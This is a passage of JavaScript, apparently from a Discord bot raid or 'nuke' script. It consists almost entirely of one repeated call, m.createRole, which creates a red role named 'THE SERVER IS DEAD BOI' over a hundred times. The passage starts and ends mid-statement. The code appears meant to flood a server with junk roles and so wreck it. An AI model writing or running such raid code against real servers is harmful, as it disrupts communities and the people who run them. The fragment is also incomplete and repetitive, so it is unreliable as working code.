        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
